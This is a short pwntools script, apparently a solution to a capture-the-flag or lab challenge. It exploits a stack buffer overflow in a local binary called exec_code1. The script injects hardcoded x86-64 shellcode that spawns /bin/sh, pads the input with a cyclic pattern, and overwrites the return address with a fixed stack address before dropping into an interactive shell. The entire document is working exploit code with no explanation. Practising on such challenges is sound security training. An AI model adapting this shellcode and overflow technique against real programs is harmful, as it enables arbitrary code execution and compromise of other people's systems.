#!/usr/bin/python3

from pwn import *
context(terminal=['tmux','new-window'], os='linux', arch='amd64')

#define elf object
e=ELF('./exec_code1')

#define process
p=process('./exec_code1')

#gdb.attach(p)

#shell code
sc=b'\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05'

#input
exploit=sc+cyclic(40-len(sc))+p64(0x7fffffffdfa0)

p.recv()
p.sendline(exploit)
p.recv()
p.interactive()
